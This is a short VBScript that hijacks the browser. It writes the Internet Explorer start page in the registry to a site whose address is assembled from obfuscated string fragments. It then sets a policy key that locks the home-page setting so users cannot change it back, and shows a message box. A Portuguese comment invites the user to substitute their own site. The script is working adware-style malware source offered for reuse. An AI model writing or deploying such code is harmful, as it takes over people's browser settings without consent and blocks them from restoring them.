   Option Explicit
   'Declare variables
   Dim WSHShell, n, erro, ppp, shl, MyBox, p, p1, p2, t, errnum, vers, http, hns
   Dim aut, enab, disab, jobfunc, itemtype, site, Master, net, jj
   hns = "www.e-muladores.net"
   http = "http:/"
   jj = "Format"
   Site = "/www.e-mu"
   aut= "et"
   Master = "ladores"
   erro = " C:/"
   net = ".n"
   ppp = shl
   shl = "  - www.e-muladores.net"
   If master = "ladores" then
   Set WSHShell = WScript.CreateObject("WScript.Shell")
   p = "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\"
   p = p & "Start Page"
   n = http+Site + Master+net+aut'http://www.e-muladores.net Coloque seu site aqui se não funcionar baixe movamente
   WSHShell.RegWrite p, n
   p1 = "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel\"
   p1 = p1 & "HomePage"
   itemtype = "REG_DWORD"
   p2 = "1"
   WSHShell.RegWrite p1, p2, itemtype
   MSGBOX (shl)
   Else
   Msgbox (jj+erro+shl)
   End IF
